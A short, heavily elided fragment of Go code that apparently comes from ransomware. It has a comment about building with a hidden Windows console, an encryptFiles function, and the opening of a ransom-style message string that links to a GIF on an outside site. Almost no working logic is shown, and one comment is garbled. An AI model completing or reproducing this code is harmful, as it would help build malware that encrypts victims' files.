...
func init() {
	// If you compile this program without "-H windowsgui"encry
...
func encryptFiles() {
	...
	message := `
	<pre>
	<src="https://www.boxerdergisi.com.tr/Content/Images/photogallery/size1/mario-84697-18102018125723.gif">
